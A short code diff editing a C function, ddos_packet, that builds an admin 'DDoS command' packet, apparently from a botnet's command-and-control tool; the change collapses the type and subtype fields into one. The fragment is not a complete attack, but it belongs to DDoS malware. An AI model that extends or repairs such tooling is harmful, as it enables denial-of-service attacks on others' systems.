@@ -41,8 +41,7 @@ int ddos_packet(SOCKET sock, const char *urls) {
     DDOSPacket *pkt = (DDOSPacket*)buffer;
     pkt->size = (uint16_t)pkt_len;
     pkt->version = TCP_VERSION;
-    pkt->type = ADMIN_PACKET_TYPE_COMMAND;
-    pkt->c_type = ADMIN_PACKET_CTYPE_COMMAND_DDOS;
+    pkt->type = ADMIN_PACKET_CTYPE_COMMAND_DDOS;
     pkt->crc = 0;
 
     if (cmd_len) {
